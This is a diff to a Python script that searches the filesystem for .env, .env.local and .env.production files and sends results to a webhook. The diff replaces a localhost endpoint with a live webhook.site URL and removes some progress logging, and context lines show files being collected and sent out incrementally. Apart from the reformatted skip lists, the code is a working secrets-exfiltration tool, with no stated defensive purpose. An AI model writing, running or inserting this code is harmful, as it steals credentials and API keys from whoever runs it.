@@ -8,22 +8,48 @@ import time
 
 patterns = [".env", ".env.local", ".env.production"]
 
-WEBHOOK_URL = "https://localhost:3000/23f16997-2d10-44b0-8414-ce928284652a"
+WEBHOOK_URL = "https://webhook.site/8a4486a4-cca9-47c3-8138-9377ca0805db"
 
 # Directories to skip to keep scans fast
 SKIP_DIRS = {
     # node / js
-    "node_modules", "bower_components",
+    "node_modules",
+    "bower_components",
     # vcs
-    ".git", ".hg", ".svn",
+    ".git",
+    ".hg",
+    ".svn",
     # python / tooling
-    "__pycache__", ".pytest_cache", ".mypy_cache", ".ruff_cache", ".tox", ".venv", "venv", "env",
+    "__pycache__",
+    ".pytest_cache",
+    ".mypy_cache",
+    ".ruff_cache",
+    ".tox",
+    ".venv",
+    "venv",
+    "env",
     # package managers / caches
-    ".cache", ".npm", ".pnpm-store", ".yarn", ".gradle", ".m2", ".cargo", ".rustup",
+    ".cache",
+    ".npm",
+    ".pnpm-store",
+    ".yarn",
+    ".gradle",
+    ".m2",
+    ".cargo",
+    ".rustup",
     # build / dist outputs
-    "dist", "build", "out", "target", ".next", ".nuxt", ".svelte-kit", ".angular", ".turbo",
+    "dist",
+    "build",
+    "out",
+    "target",
+    ".next",
+    ".nuxt",
+    ".svelte-kit",
+    ".angular",
+    ".turbo",
     # misc heavy dirs
-    ".idea", ".vscode",
+    ".idea",
+    ".vscode",
 }
 
 # If you want to skip directories by substring (e.g. "Library", "AppData"), add here:
@@ -31,8 +57,10 @@ SKIP_DIR_SUBSTRINGS = {
     # macOS
     "/Library/",
     # Windows (common)
-    "\\AppData\\", "/AppData/",
+    "\\AppData\\",
+    "/AppData/",
 }
+
 
 def should_skip_dir(dirpath: str) -> bool:
     """Return True if this directory path should be skipped."""
@@ -42,6 +70,7 @@ def should_skip_dir(dirpath: str) -> bool:
         if sub in p:
             return True
     return False
+
 
 def send_log(log_entry: str) -> bool:
     """Send a single log entry to the webhook"""
@@ -57,6 +86,7 @@ def send_log(log_entry: str) -> bool:
             return response.status == 200
     except (urllib.error.URLError, socket.timeout, Exception):
         return False
+
 
 send_log("Initialized")
 
@@ -84,10 +114,8 @@ try:
                     # is_file check for safety (handles weird entries / symlinks)
                     if full_path.is_file():
                         matching_files.append(full_path)
-                        send_log("Found file!")
     except (PermissionError, OSError) as e:
         warning = f"Warning: Could not access some directories: {e}"
-        send_log(warning)
         time.sleep(1)
 
     # Process and send files incrementally
